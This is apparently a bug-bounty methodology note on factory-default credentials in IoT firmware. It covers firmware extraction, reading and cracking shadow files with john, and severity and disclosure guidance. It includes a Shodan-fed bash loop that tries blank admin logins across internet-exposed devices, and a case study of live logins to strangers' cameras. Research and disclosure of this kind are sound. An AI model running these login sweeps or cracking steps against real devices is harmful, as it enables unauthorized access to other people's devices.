---
type: pattern
title: Pattern - Default Credentials in Firmware
tags: [pattern, cwe-1188, cwe-798, cwe-521, firmware, iot, default-credentials, shodan, bb-pattern]
status: verified
vuln_class: hardcoded-credentials
severity_range: P1-P3
last_updated: 2026-06-03
---

# Pattern - Default Credentials in Firmware

> IoT/embedded firmware ships with built-in default credentials or blank passwords, and a factory reset restores that state. Firmware static extraction combined with a public list of known defaults finds this class directly; devices exposed to the internet require no prior knowledge to log in.

---

## Distinction from "Pattern - Hardcoded Credentials"

[[Pattern - Hardcoded Credentials]] covers all hardcoded-secret scenarios (APKs, SPA JS, backend config, JWT secrets, etc.). This pattern is specific to **IoT/embedded firmware factory-default credentials**. The distinguishing traits:

- The vendor intends for the credential to be known (documented in a manual) but never enforces changing it
- The issue reappears after a `factory reset`
- Devices exposed on the internet can be found in bulk via Shodan/Censys

---

## Detection Signals

| Signal | Notes |
|--------|-------|
| `/etc/default/default.conf` | common in embedded Linux, format `ACCOUNT_USER0='username,password'` |
| `/etc/passwd` + `/etc/shadow` | find default users; weak hashes in shadow can be cracked offline |
| `/etc/inittab` / `/etc/inetd.conf` | confirm which services start on boot |
| Web UI login page | `admin/admin`, `admin/` (blank password), `admin/1234`, `admin/device_model` |
| Bulk verification against same-model devices via Shodan/Censys | test default passwords across all devices sharing a fingerprint |
| Manual / quick-install guide | vendor documentation states the factory credential but provides no enforced change mechanism |

---

## Test / Grep Methodology

### Step 1: Firmware extraction

```bash
# extract
binwalk -Me firmware.bin

# find credential configuration
cat squashfs-root/etc/default/default.conf
cat squashfs-root/etc/passwd
cat squashfs-root/etc/shadow

# search for default-credential strings
strings squashfs-root/usr/bin/* | grep -iE "password|default.*pass|admin.*pass"
grep -r "ACCOUNT_USER\|DEFAULT_PASS\|admin" squashfs-root/etc/ 2>/dev/null
```

### Step 2: Identify the format

```
# Common IP-camera vendor format (/etc/default/default.conf)
ACCOUNT_USER0='admin,'          # empty after the comma = blank password
ACCOUNT_USER0='admin,1234'      # a default password after the comma
ACCOUNT_USER1='root,rootpass'   # a secondary account
```

### Step 3: Bulk Shodan verification

```bash
# find same-model devices (example fingerprint)
shodan search 'Httpd v1.0 05may2008' --fields ip_str,port,hostnames > device_targets.txt

# bulk-test default credentials
while read ip port; do
  result=$(curl -s -o /dev/null -w "%{http_code}" \
    --max-time 5 \
    "http://$ip:$port/cgi-bin/cmd.cgi?cmd=LOGIN&USER=admin&PASSWORD=" 2>/dev/null)
  echo "$ip:$port -> $result"
done < device_targets.txt
```

### Step 4: Confirm factory-reset behavior

- Trigger a factory reset (identify the reset API/button during firmware analysis)
- Confirm credentials revert to the default value
- Record: the vulnerability reappears on every reset

---

## Variants

| Variant | Example | Severity |
|---------|---------|----------|
| **Blank password** (format `username,`) | `admin,` in `/etc/default/default.conf` | P1 |
| **Weak default password** (`admin/1234`, `admin/123456`) | live devices with `admin:123456`; SSH `root:123456` | P1 |
| **Same password across an entire product line** (not per-device) | HTTP Basic Auth shared across all devices from one vendor | P1 |
| **Secondary/backdoor account** | a firmware `ACCOUNT_USER1` present but not shown in the UI | P1 |
| **Password printed on the device enclosure** (per-device, but algorithm is predictable) | some router/camera vendors | P2-P1 depending on the algorithm |

---

## Severity Guide

| Level | Condition |
|-------|-----------|
| **P1 (Critical)** | Blank password or a weak password shared across an entire product line, device has a network management interface, exposed live devices findable via Shodan |
| **P1 (Critical)** | Chains into RCE (e.g., default creds → OS command injection) |
| **P2 (High)** | Default password is documented and users are expected to change it manually, but there is no enforced mechanism |
| **P3 (Medium)** | Weak password but the device is only reachable on the local network (requires AC:H) |
| **Downgrade condition** | Vendor documentation clearly discloses the default and warns to change it — but if a factory reset restores it, keep as P1 |

### Example CVSS reference

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8 Critical**

---

## Case Study

### Blank-password default account in a consumer IP-camera firmware line (verification_level: A)

- The latest firmware release's `/etc/default/default.conf`, line 5: `ACCOUNT_USER0='admin,'`
- Format `username,password`; empty after the comma = no password
- Factory reset restores this state
- A Shodan fingerprint search returned 1,000+ globally exposed devices
- Live-verified against a sample of 8 devices: 2/8 logged in successfully with `admin:123456` (default had been changed from blank to a weak password, but still no password policy)
- Chained with an OS command injection finding on the same firmware to reach RCE

### Shared HTTP Basic Auth credential across an entire camera product line

- Every device in the line shared the exact same API credential pair
- Discovered by decompiling the companion Android APK with `jadx` — the shared credential granted API access to any camera from that vendor

---

## Full Firmware Static Analysis Workflow

```bash
# 1. Version + CVE precheck
# Confirm whether this firmware already has a published CVE before investing further time

# 2. Extraction
binwalk -Me firmware.bin
cd _firmware.bin.extracted/squashfs-root/

# 3. Locate credentials
cat etc/default/default.conf
cat etc/passwd && cat etc/shadow
grep -r "password\|passwd\|secret\|admin" etc/ --include="*.conf" -l

# 4. Confirm services (identify the management-interface path)
cat etc/inittab
find . -name "*.cgi" -o -name "httpd.conf" 2>/dev/null

# 5. Crack the shadow hash if present
john --wordlist=/usr/share/wordlists/rockyou.txt shadow
```

---

## Platform Selection

| Finding type | Suggested platform |
|---------------|---------------------|
| Domestic vendor firmware, CVSS ≥ 9.0, chainable to RCE | National CERT (CVE track) |
| IoT vendor with a HackerOne/Bugcrowd program | corresponding BB platform |
| Shodan-confirmed exposed live devices (CWE-1188) | include proof of internet exposure |

---

## Related

- [[Pattern - Hardcoded Credentials]] — broader hardcoded-credential class (APK/SPA/backend); this pattern is the IoT/firmware subset
- [[Pattern - Firmware CGI Command Injection Grep]] — common chain target (default creds → RCE)
